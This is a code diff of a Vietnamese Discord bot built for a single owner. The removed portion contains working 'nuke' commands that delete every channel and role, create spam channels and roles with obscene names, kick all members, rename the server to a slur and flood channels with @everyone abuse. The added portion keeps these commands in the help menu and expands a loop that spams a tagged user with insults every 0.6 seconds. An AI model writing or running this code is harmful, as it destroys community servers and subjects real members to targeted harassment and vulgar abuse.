+            "   └ *Kick tất cả thành viên ngoại trừ bot và owner.*\n\n"
+            "🔹 **19. `l!setservername [tên mới]`**\n"
+            "   └ *Thay đổi tên server.*\n\n"
+            "🔹 **20. `l!setservericon [url]`**\n"
+            "   └ *Thay đổi icon server.*\n\n"
+            "🔹 **21. `l!ultimatenuke`**\n"
+            "   └ *Lệnh tổng hợp nuke toàn diện.*"
+        ),
+        color=0xFF69B4
+    )
+    embed.set_image(url=CUSTOM_SETUP_GIF)
+    embed.set_footer(text="Hệ thống quản trị tối cao • Độc quyền phục vụ Boss Tuyền 💖", icon_url=ctx.author.display_avatar.url)
+    await ctx.send(embed=embed)
 
-        try:
-            msg = await bot.wait_for('message', timeout=30.0, check=check)
-            if msg.content.lower() != "l!confirmnuke":
-                await ctx.send("❌ Lệnh nuke đã bị hủy bỏ.")
-                return
-        except asyncio.TimeoutError:
-            await ctx.send("⏳ Hết thời gian chờ. Lệnh nuke đã bị hủy bỏ.")
-            return
-
-        nuke_embed = discord.Embed(
-            title="🚀 KÍCH HOẠT GIAI ĐOẠN NUKE SERVER 🚀",
-            description="🔥 **Đang thực hiện phá hủy toàn bộ server...** 🔥",
-            color=0xFF0000
-        )
-        await ctx.send(embed=nuke_embed)
-
-        for channel in ctx.guild.channels:
-            try:
-                await channel.delete()
-            except:
-                continue
-
-        for i in range(100):
-            try:
-                channel_name = random.choice(NUKE_CHANNEL_NAMES)
-                await ctx.guild.create_text_channel(name=channel_name)
-            except:
-                continue
-
-        spam_content = "@everyone # LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG, BỊ ĐỊT ĐẾN KHÔNG CÒN + CHẢY LÊNH LÁNG! l!help"
-
-        for channel in ctx.guild.text_channels:
-            try:
-                for _ in range(10):
-                    await channel.send(spam_content)
-                    await asyncio.sleep(0.1)
-            except:
-                continue
-
-        complete_embed = discord.Embed(
-            title="💥 NUKE SERVER HOÀN TẤT 💥",
-            description=(
-                f"🔥 **Server đã bị phá hủy hoàn toàn theo lệnh của Boss Tuyền!** 🔥\n\n"
-                f"• **Đã xóa:** Tất cả kênh gốc\n"
-                f"• **Đã tạo:** 100 kênh mới với tên tục tĩu\n"
-                f"• **Đã spam:** 10 lần @everyone + câu chửi trong mỗi kênh\n\n"
-                f"💀 **Server này đã trở thành địa ngục sắc hồng!** 💀"
-            ),
-            color=0xFF0000
-        )
-        await ctx.send(embed=complete_embed)
-
-    except Exception as e:
-        error_embed = discord.Embed(
-            title="❌ LỖI KHI THỰC HIỆN NUKE",
-            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
-            color=0xFF0000
-        )
-        await ctx.send(embed=error_embed)
-
-@nuke_server.error
-async def nuke_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="spamchannels")
-@is_bot_owner()
-async def spam_channels(ctx, amount: int = 100):
-    try:
-        if amount > 200:
-            amount = 200
-        embed = discord.Embed(
-            title="🚀 KÍCH HOẠT TẠO KÊNH SPAM",
-            description=f"🔥 **Đang tạo {amount} kênh với tên tục tĩu...** 🔥",
-            color=0xFF69B4
-        )
-        await ctx.send(embed=embed)
-
-        for i in range(amount):
-            try:
-                channel_name = random.choice(NUKE_CHANNEL_NAMES)
-                await ctx.guild.create_text_channel(name=channel_name)
-                await asyncio.sleep(0.5)
-            except:
-                continue
-
-        complete_embed = discord.Embed(
-            title="✅ TẠO KÊNH HOÀN TẤT",
-            description=f"🎉 **Đã tạo thành công {amount} kênh spam với tên tục tĩu!**",
-            color=0x00FF00
-        )
-        await ctx.send(embed=complete_embed)
-    except Exception as e:
-        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")
-
-@spam_channels.error
-async def spam_channels_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="spameveryone")
-@is_bot_owner()
-async def spam_everyone(ctx):
-    try:
-        spam_content = "@everyone # ĐỤ MẸ CẢ SERVER NÀY ĐI, LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG! l!help"
-        embed = discord.Embed(
-            title="🚀 KÍCH HOẠT SPAM @EVERYONE",
-            description="🔥 **Đang spam @everyone trong tất cả kênh...** 🔥",
-            color=0xFF69B4
-        )
-        await ctx.send(embed=embed)
-
-        for channel in ctx.guild.text_channels:
-            try:
-                for _ in range(10):
-                    await channel.send(spam_content)
-                    await asyncio.sleep(0.1)
-            except:
-                continue
-        await ctx.send("✅ Đã hoàn tất spam @everyone!")
-    except Exception as e:
-        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")
-
-@spam_everyone.error
-async def spam_everyone_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="deleteallchannels")
-@is_bot_owner()
-async def delete_all_channels(ctx):
-    try:
-        confirm_embed = discord.Embed(
-            title="⚠️ XÁC NHẬN XÓA TẤT CẢ KÊNH ⚠️",
-            description="🔹 **Gõ l!confirmdelete để xác nhận**\n🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**",
-            color=0xFF0000
-        )
-        await ctx.send(embed=confirm_embed)
-        def check(m):
-            return m.author == ctx.author and m.channel == ctx.channel
-        msg = await bot.wait_for('message', timeout=30.0, check=check)
-        if msg.content.lower() != "l!confirmdelete":
-            await ctx.send("❌ Hủy bỏ.")
-            return
-        for channel in ctx.guild.channels:
-            try:
-                await channel.delete()
-                await asyncio.sleep(0.3)
-            except:
-                continue
-        await ctx.send("✅ Đã xóa toàn bộ kênh!")
-    except asyncio.TimeoutError:
-        await ctx.send("⏳ Hết thời gian chờ.")
-    except Exception as e:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
-
-@delete_all_channels.error
-async def delete_all_channels_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="spamroles")
-@is_bot_owner()
-async def spam_roles(ctx, amount: int = 50):
-    try:
-        if amount > 250:
-            amount = 250
-        for i in range(amount):
-            try:
-                role_name = random.choice(NUKE_CHANNEL_NAMES)
-                color = discord.Color(random.randint(0, 0xFFFFFF))
-                await ctx.guild.create_role(name=role_name, color=color, hoist=True, mentionable=True)
-                await asyncio.sleep(0.3)
-            except:
-                continue
-        await ctx.send(f"✅ Đã tạo thành công {amount} role!")
-    except Exception as e:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
-
-@spam_roles.error
-async def spam_roles_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="deleteallroles")
-@is_bot_owner()
-async def delete_all_roles(ctx):
-    try:
-        for role in ctx.guild.roles:
-            if role.name != "@everyone":
-                try:
-                    await role.delete()
-                    await asyncio.sleep(0.3)
-                except:
-                    continue
-        await ctx.send("✅ Đã xóa tất cả các role!")
-    except Exception as e:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
-
-@delete_all_roles.error
-async def delete_all_roles_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="kickall")
-@is_bot_owner()
-async def kick_all_members(ctx):
-    try:
-        for member in ctx.guild.members:
-            if not member.bot and member.id not in BOT_OWNERS and member.id != ctx.guild.owner_id:
-                try:
-                    await member.kick(reason="Server nuke theo lệnh Boss Tuyền")
-                    await asyncio.sleep(0.5)
-                except:
-                    continue
-        await ctx.send("✅ Đã kick toàn bộ thành viên hợp lệ!")
-    except Exception as e:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
-
-@kick_all_members.error
-async def kick_all_members_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="setservername")
-@is_bot_owner()
-async def set_server_name(ctx, *, new_name: str):
-    try:
-        await ctx.guild.edit(name=new_name[:100])
-        await ctx.send(f"✅ Đã đổi tên server thành: {new_name}")
-    except Exception as e:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
-
-@set_server_name.error
-async def set_server_name_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="setservericon")
-@is_bot_owner()
-async def set_server_icon(ctx, url: str = None):
-    import aiohttp
-    try:
-        image_data = None
-        if url:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url) as resp:
-                    if resp.status == 200:
-                        image_data = await resp.read()
-        await ctx.guild.edit(icon=image_data)
-        await ctx.send("✅ Đã cập nhật icon server!")
-    except Exception as e:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
-
-@set_server_icon.error
-async def set_server_icon_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-
-@bot.command(name="ultimatenuke")
-@is_bot_owner()
-async def ultimate_nuke(ctx):
-    try:
-        confirm_embed = discord.Embed(
-            title="⚠️ XÁC NHẬN ULTIMATE NUKE ⚠️",
-            description="🔹 **Gõ l!confirmultimatenuke để xác nhận**",
-            color=0xFF0000
-        )
-        await ctx.send(embed=confirm_embed)
-        def check(m):
-            return m.author == ctx.author and m.channel == ctx.channel
-        msg = await bot.wait_for('message', timeout=30.0, check=check)
-        if msg.content.lower() != "l!confirmultimatenuke":
-            await ctx.send("❌ Hủy bỏ.")
-            return
-
-        for channel in ctx.guild.channels:
-            try: await channel.delete()
-            except: continue
-
-        for _ in range(100):
-            try: await ctx.guild.create_text_channel(name=random.choice(NUKE_CHANNEL_NAMES))
-            except: continue
-
-        for _ in range(50):
-            try: await ctx.guild.create_role(name=random.choice(NUKE_CHANNEL_NAMES), color=discord.Color(random.randint(0, 0xFFFFFF)))
-            except: continue
-
-        for member in ctx.guild.members:
-            if not member.bot and member.id not in BOT_OWNERS and member.id != ctx.guild.owner_id:
-                try: await member.kick()
-                except: continue
-
-        try: await ctx.guild.edit(name="LỒN MẸ MÀY NÁT BÉT")
-        except: pass
-
-        for channel in ctx.guild.text_channels:
-            try:
-                for _ in range(5):
-                    await channel.send("@everyone # LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG!")
-            except: continue
-
-        await ctx.send("💥 **ULTIMATE NUKE HOÀN TẤT!**")
-    except Exception as e:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
-
-@ultimate_nuke.error
-async def ultimate_nuke_error(ctx, error):
+@setup.error
+async def setup_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
 
@@ -797,7 +1169,8 @@ async def persona(ctx, persona_id: int = None):
             description=(
                 f"🎀 Kính thưa Boss Tuyền kính yêu, xin vui lòng chọn đúng số thứ tự mã nhân cách chuẩn xác:\n\n"
                 f"• Gõ `l!persona 1` để chuyển sang nhân cách **Sweet Princess Hồng 🌸** ngọt ngào, hiền dịu.\n"
-                f"• Gõ `l!persona 2` để chuyển sang nhân cách **Cold Master Hồng 🗿** lạnh lùng, kiêu ngạo tột độ."
+                f"• Gõ `l!persona 2` để chuyển sang nhân cách **Cold Master Hồng 🗿** lạnh lùng, kiêu ngạo tột độ.\n\n"
+                f"🌸 Xin vui lòng thao tác lại để hệ thống phục vụ Boss Tuyền một cách hoàn hảo nhất nhé! 💕"
             ),
             color=0xFF1493
         )
@@ -806,13 +1179,18 @@ async def persona(ctx, persona_id: int = None):
 
     current_persona_id = persona_id
     last_active_persona_id = persona_id
+
     p_info = PERSONAS[current_persona_id]
-    
     embed = discord.Embed(
         title="✨ CHUYỂN ĐỔI GIAO DIỆN NHÂN CÁCH THÀNH CÔNG RỰC RỠ ✨",
-        description=f"👑 Nhân cách hiện tại: `{p_info['name']}`",
+        description=(
+            f"👑 Toàn bộ hệ thống AI đã được tái cấu trúc hoàn toàn theo nguyện vọng của Boss Tuyền!\n\n"
+            f"🌸 **Nhân cách hiện tại:** `{p_info['name']}`\n"
+            f"💖 Sẵn sàng tuân lệnh tuyệt đối và phủ sóng sắc hồng khắp mọi ngóc ngách không gian server!"
+        ),
         color=p_info['color']
     )
+    embed.set_footer(text="Hệ thống nhân cách cao cấp • Độc quyền phục vụ Boss Tuyền 🌸", icon_url=ctx.author.display_avatar.url)
     await ctx.send(embed=embed)
 
 @persona.error
@@ -824,22 +1202,47 @@ async def persona_error(ctx, error):
 @is_bot_owner()
 async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
     global spam_task_running, is_spamming
+    
     if member is None:
-        await ctx.send("⚠️ Vui lòng tag thành viên cần spam! Cú pháp: `l!spam @user [nội dung]`")
+        embed = discord.Embed(
+            title="⚠️ THIẾU THÔNG TIN MỤC TIÊU TRONG LÔI ĐÀI SPAM",
+            description=(
+                f"🎀 Kính thưa Boss Tuyền, để kích hoạt lôi đài spam văn bản tốc độ cao, Boss vui lòng tag tên thành viên cần nhắm tới.\n\n"
+                f"📌 **Cú pháp chuẩn:** `l!spam @user [câu chửi tùy chỉnh của Boss (nếu muốn)]`\n"
+                f"🌸 Nếu Boss không nhập nội dung tùy chỉnh, hệ thống sẽ tự động bốc thăm ngẫu nhiên vô tận từ kho 209 câu chửi cực gắt trong cơ sở dữ liệu màu hồng!"
+            ),
+            color=0xFF007F
+        )
+        await ctx.send(embed=embed)
         return
 
     if spam_task_running and not spam_task_running.done():
         spam_task_running.cancel()
 
     is_spamming = True  
-    await ctx.send(f"🚨 Kích hoạt spam nhắm tới {member.mention}! Gõ `l!stop` để dừng.")
+    embed_notice = discord.Embed(
+        title="🚨 KÍCH HOẠT LÔI ĐÀI TẤN CÔNG VĂN BẢN TỐC ĐỘ CAO (600MS/CÂU) 🚨",
+        description=(
+            f"👑 Theo sắc lệnh của **Boss Tuyền**, chiến dịch lôi đài trừng phạt mục tiêu {member.mention} chính thức bắt đầu trong không gian rực lửa sắc hồng! 🔥🖕\n\n"
+            f"📌 Gõ lệnh `l!stop` bất cứ lúc nào nếu Boss muốn đình chỉ chiến dịch này."
+        ),
+        color=0xFF69B4
+    )
+    await ctx.send(embed=embed_notice)
 
     async def spam_loop():
         try:
             while True:
-                msg = f"{member.mention} {custom_text}" if custom_text else random.choice(ROAST_LINES).format(username=member.mention)
+                if custom_text:
+                    msg = f"{member.mention} {custom_text}"
+                else:
+                    template = random.choice(ROAST_LINES)
+                    msg = template.format(username=member.mention)
+                
                 await ctx.send(msg)
                 await asyncio.sleep(0.6)
+        except discord.Forbidden:
+            print("[SPAM ERROR]: Bot bị mất quyền (Missing Access) tại kênh này!")
         except asyncio.CancelledError:
             pass
         except Exception as e:
@@ -861,7 +1264,13 @@ async def stop_bot(ctx):
     if spam_task_running:
         spam_task_running.cancel()
         spam_task_running = None
-    await ctx.send("🛑 Đã dừng toàn bộ hoạt động và lôi đài spam theo lệnh Boss Tuyền.")
+
+    embed = discord.Embed(
+        title="🛑 ĐÃ PHANH GẤP VÀ DỪNG TOÀN BỘ HOẠT ĐỘNG, LÔI ĐÀI SPAM THEO LỆNH BOSS TUYỀN",
+        description="🎀 Mọi tác vụ tự động, lôi đài chửi và phản hồi AI đã được đóng băng hoàn toàn trong sự yên bình màu hồng. ✨",
+        color=0xFF0000
+    )
+    await ctx.send(embed=embed)
 
 @stop_bot.error
 async def stop_error(ctx, error):
@@ -872,10 +1281,22 @@ async def stop_error(ctx, error):
 @is_bot_owner()
 async def bot_on(ctx):
     global current_persona_id, last_active_persona_id, bot_stopped, is_spamming
+    
     bot_stopped = False
     is_spamming = False
     current_persona_id = last_active_persona_id
-    await ctx.send("🟢 Hệ thống AI đã được tái kích hoạt thành công!")
+    
+    if isinstance(current_persona_id, int) and current_persona_id in PERSONAS:
+        p_name = PERSONAS[current_persona_id]['name']
+    else:
+        p_name = "Nhân cách tùy chỉnh của thành viên ✨"
+        
+    embed = discord.Embed(
+        title=f"🟢 HỆ THỐNG ĐÃ ĐƯỢC TÁI KÍCH HOẠT THÀNH CÔNG RỰC RỠ",
+        description=f"👑 Theo chỉ thị của **Boss Tuyền**, toàn bộ kênh chat AI và không gian màu hồng đã hoạt động trở lại với trạng thái: **{p_name}** 🌸✨",
+        color=0x00FF00
+    )
+    await ctx.send(embed=embed)
 
 @bot_on.error
 async def bot_on_error(ctx, error):
@@ -887,7 +1308,12 @@ async def bot_on_error(ctx, error):
 async def bot_off(ctx):
     global current_persona_id
     current_persona_id = None
-    await ctx.send("🔌 Đã tạm thời đóng băng kênh phản hồi chat AI.")
+    embed = discord.Embed(
+        title="🔌 ĐÃ TẠM THỜI ĐÓNG BĂNG KÊNH PHẢN HỒI CHAT AI",
+        description="🎀 Theo lệnh của Boss Tuyền, tính năng trò chuyện tự động của AI đã được tắt tạm thời để giữ không gian tĩnh lặng màu hồng. ✨",
+        color=0xFF9900
+    )
+    await ctx.send(embed=embed)
 
 @bot_off.error
 async def bot_off_error(ctx, error):
@@ -898,13 +1324,28 @@ async def bot_off_error(ctx, error):
 @is_bot_owner()
 async def ban(ctx, member: discord.Member = None, *, reason="Boss Tuyền không nêu rõ lý do cụ thể"):
     if member is None:
-        await ctx.send("⚠️ Vui lòng tag thành viên cần ban!")
+        embed = discord.Embed(
+            title="⚠️ THIẾU THÔNG TIN THÀNH VIÊN CẦN TRỤC XUẤT",
+            description="🎀 Kính thưa Boss Tuyền, vui lòng tag tên thành viên cần trục xuất khỏi vương quốc hồng. Ví dụ: `l!ban @user [lý do]`",
+            color=0xFF007F
+        )
+        await ctx.send(embed=embed)
         return
     try:
         await member.ban(reason=reason)
-        await ctx.send(f"🔨 Đã ban {member.mention}. Lý do: `{reason}`")
+        embed = discord.Embed(
+            title="🔨 TRỤC XUẤT THÀNH VIÊN KHỎI VƯƠNG QUỐC HỒNG THÀNH CÔNG",
+            description=f"👑 Mục tiêu {member.mention} đã bị trục xuất vĩnh viễn theo lệnh của **Boss Tuyền**.\n📌 **Lý do:** `{reason}`",
+            color=0xFF69B4
+        )
+        await ctx.send(embed=embed)
     except Exception:
-        await ctx.send("❌ Không thể ban thành viên này (thiếu quyền hoặc vai trò cao hơn).")
+        embed = discord.Embed(
+            title="❌ KHÔNG THỂ THỰC THI LỆNH TRỤC XUẤT",
+            description="🥺 Ôi Boss ơi, mục tiêu này có chức vụ/vai trò cao hơn hoặc bằng bot, hoặc bot đang bị thiếu quyền hạn (Ban Members) trong server mất rồi!",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
 
 @ban.error
 async def ban_error(ctx, error):
@@ -914,63 +1355,99 @@ async def ban_error(ctx, error):
 @bot.command(name="stats")
 async def stats(ctx):
     guild = ctx.guild
-    p_name = PERSONAS[current_persona_id]['name'] if isinstance(current_persona_id, int) and current_persona_id in PERSONAS else "Tùy chỉnh ✨"
+    
+    if isinstance(current_persona_id, int) and current_persona_id in PERSONAS:
+        p_name = PERSONAS[current_persona_id]['name']
+    else:
+        p_name = "Nhân cách tùy chỉnh của thành viên ✨"
+    
+    total_members = guild.member_count
+    bots = sum(1 for m in guild.members if m.bot)
+    humans = total_members - bots
+    
+    text_channels = len(guild.text_channels)
+    voice_channels = len(guild.voice_channels)
+    categories = len(guild.categories)
+    total_channels = len(guild.channels)
+    
+    roles_count = len(guild.roles)
+    owner = guild.owner.mention if guild.owner else "Không rõ"
     
     embed = discord.Embed(
-        title=f"📊 THÔNG SỐ CHI TIẾT MÁY CHỦ",
-        description=f"🏰 **Tên:** `{guild.name}`\n👥 **Thành viên:** `{guild.member_count}`\n🌸 **Trạng thái AI:** `{p_name}`",
-        color=0xFF69B4
-    )
-    await ctx.send(embed=embed)
-
-@bot.command(name="setup")
-@is_bot_owner()
-async def setup(ctx):
-    global current_persona_id, last_active_persona_id, bot_stopped, is_spamming, spam_task_running
-    current_persona_id = 1
-    last_active_persona_id = 1
-    bot_stopped = False
-    is_spamming = False
-    if spam_task_running:
-        spam_task_running.cancel()
-        spam_task_running = None
-
-    embed = discord.Embed(
-        title="💖✨ BẢNG ĐIỀU KHIỂN TỐI CAO - BOSS TUYỀN ✨💖",
+        title=f"📊 THÔNG SỐ CHI TIẾT KHÔNG GIAN MÁY CHỦ TRONG SẮC HỒNG",
         description=(
-            "🎮 **KHU VUI CHƠI MEMBER:**\n"
-            "• `l!work` - Làm việc kiếm coin\n"
-            "• `l!setpersona [yêu cầu]` - Tùy chỉnh nhân cách bot (5000 coin)\n\n"
-            "⚙️ **QUẢN TRỊ & NUKE:**\n"
-            "• `l!setup` | `l!persona <1|2>` | `l!spam` | `l!stop` | `l!on` | `l!off`\n"
-            "• `l!stats` | `l!ban` | `l!nuke` | `l!spamchannels` | `l!spameveryone`\n"
-            "• `l!deleteallchannels` | `l!spamroles` | `l!deleteallroles`\n"
-            "• `l!kickall` | `l!setservername` | `l!setservericon` | `l!ultimatenuke`"
+            f"🏰 **Tên máy chủ:** `{guild.name}`\n"
+            f"🆔 **ID máy chủ:** `{guild.id}`\n"
+            f"👑 **Chủ thực quyền tối cao:** {owner}\n"
+            f"🌸 **Bảo trợ độc quyền:** Boss Tuyền yêu quý ✨\n"
+            f"🎀 **Trạng thái AI:** `{p_name}`"
         ),
         color=0xFF69B4
     )
-    embed.set_image(url=CUSTOM_SETUP_GIF)
+    
+    embed.add_field(
+        name="👥 Thống kê nhân sự",
+        value=f"• Tổng cộng: `{total_members}`\n• Con người: `{humans}`\n• Bot hệ thống: `{bots}`",
+        inline=True
+    )
+    
+    embed.add_field(
+        name="📁 Kiến trúc & Phân khu",
+        value=f"• Tổng kênh: `{total_channels}`\n• Kênh văn bản: `{text_channels}`\n• Kênh thoại: `{voice_channels}`\n• Danh mục: `{categories}`\n• Vai trò: `{roles_count}`",
+        inline=True
+    )
+    
+    if guild.icon:
+        embed.set_thumbnail(url=guild.icon.url)
+        
+    embed.set_footer(text=f"Truy vấn bởi {ctx.author.name} • Cung kính phục vụ Boss Tuyền & Cộng đồng trong sắc hồng ⚡", icon_url=ctx.author.display_avatar.url)
+    
     await ctx.send(embed=embed)
-
-@setup.error
-async def setup_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
 
 @bot.command(name="help")
 async def help_command(ctx):
     embed = discord.Embed(
-        title="📖 CẨM NANG HƯỚNG DẪN HỆ THỐNG MÀU HỒNG 🌸",
+        title="📖 CẨM NANG ĐIỀU HÀNH TỐI TÂN & DÀI DÒNG - HỆ THỐNG MÀU HỒNG 🌸",
         description=(
-            "Danh sách toàn bộ các lệnh khả dụng:\n\n"
-            "🎮 **Member:** `l!work`, `l!setpersona`\n"
-            "⚙️ **Quản trị:** `l!setup`, `l!persona`, `l!spam`, `l!stop`, `l!on`, `l!off`, `l!stats`, `l!ban`\n"
-            "💣 **Nuke:** `l!nuke`, `l!spamchannels`, `l!spameveryone`, `l!deleteallchannels`, `l!spamroles`, `l!deleteallroles`, `l!kickall`, `l!setservername`, `l!setservericon`, `l!ultimatenuke`"
+            "Chào mừng toàn thể thần dân và các thành viên đến với bảng cẩm nang hướng dẫn chi tiết, dài dòng và lộng lẫy nhất trong không gian màu hồng rực rỡ của **Sun Flower AI**. "
+            "Toàn bộ hệ thống được xây dựng và tối ưu hóa với quyền lực tối thượng thuộc về **Boss Tuyền**.\n\n"
+            "Dưới đây là danh sách đầy đủ, chi tiết từng câu lệnh cùng công dụng từ A đến Z:\n\n"
+            "🎮 **KHU VUI CHƠI DÀNH CHO TẤT CẢ MEMBER:**\n"
+            "• `l!work`\n"
+            "  └ *Ghi chú dài dòng:* Lệnh vô cùng thú vị giúp bạn tham gia vào 1 trong 50 kịch bản làm việc ngẫu nhiên cực kỳ hấp dẫn trong không gian vũ trụ. Mỗi lần gõ lệnh, hệ thống sẽ tự động thưởng nóng cho bạn từ 100 đến 2000 coin sắc hồng để tích lũy làm giàu! 🪙✨\n\n"
+            "• `l!setpersona [yêu cầu chi tiết của bạn]`\n"
+            "  └ *Ghi chú dài dòng:* Sử dụng 5000 coin tích lũy kiếm được để toàn quyền sai khiến bot thay đổi nhân cách, hành vi theo ý muốn của bạn! 💕\n\n"
+            "⚙️ **CÁC LỆNH ĐIỀU HÀNH & QUẢN TRỊ TỐI CAO (ĐỘC QUYỀN DÀNH CHO BOSS TUYỀN):**\n"
+            "• `l!setup` - Khởi tạo lại toàn bộ bảng điều khiển trung tâm.\n"
+            "• `l!persona <1|2>` - Chuyển đổi trạng thái nhân cách chính của bot.\n"
+            "• `l!spam @user [nội dung tùy chỉnh]` - Kích hoạt lôi đài chiến dịch trừng phạt mục tiêu.\n"
+            "• `l!stop` - Phanh gấp lập tức mọi hoạt động spam.\n"
+            "• `l!on` / `l!off` - Bật/tắt phản hồi tin nhắn tự động.\n"
+            "• `l!stats` - Trích xuất thông số kỹ thuật chi tiết của máy chủ.\n"
+            "• `l!ban @user [lý do]` - Trục xuất vĩnh viễn thành viên vi phạm.\n"
+            "• `l!nuke` - Xóa tất cả kênh, tạo 100 kênh spam, spam @everyone.\n"
+            "• `l!spamchannels [số lượng]` - Tạo nhiều kênh spam (mặc định 100).\n"
+            "• `l!spameveryone` - Spam @everyone trong tất cả kênh text.\n"
+            "• `l!deleteallchannels` - Xóa tất cả kênh trong server.\n"
+            "• `l!spamroles [số lượng]` - Tạo nhiều role spam (mặc định 50).\n"
+            "• `l!deleteallroles` - Xóa tất cả role ngoại trừ @everyone.\n"
+            "• `l!kickall` - Kick tất cả thành viên ngoại trừ bot, owner và BOT_OWNERS.\n"
+            "• `l!setservername [tên mới]` - Thay đổi tên server.\n"
+            "• `l!setservericon [url]` - Thay đổi icon server.\n"
+            "• `l!ultimatenuke` - Lệnh tổng hợp nuke toàn diện."
         ),
         color=0xFF69B4
     )
+    embed.set_footer(text="Cẩm nang điều hành tối tân • Tôn vinh Boss Tuyền & Phủ sóng sắc hồng 💖", icon_url=bot.user.display_avatar.url)
     await ctx.send(embed=embed)
 
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, (commands.CommandNotFound, discord.errors.Forbidden)):
+        return
+    print(f"[ERROR]: {error}")
+
+# ==================== XỬ LÝ TIN NHẮN TỰ ĐỘNG & BỎ QUA LỆNH ====================
 @bot.event
 async def on_message(message):
     if message.author.bot:
@@ -985,11 +1462,18 @@ async def on_message(message):
         return
 
     try:
+        user_id = message.author.id
+        
         if str(current_persona_id).startswith("custom_"):
             owner_custom_id = int(current_persona_id.split("_")[1])
-            p_info = CUSTOM_USER_PERSONAS.get(owner_custom_id, PERSONAS[1])
+            if owner_custom_id in CUSTOM_USER_PERSONAS:
+                p_info = CUSTOM_USER_PERSONAS[owner_custom_id]
+            else:
+                p_info = PERSONAS[1]
+        elif current_persona_id in PERSONAS:
+            p_info = PERSONAS[current_persona_id]
         else:
-            p_info = PERSONAS.get(current_persona_id, PERSONAS[1])
+        	p_info = PERSONAS[1]
 
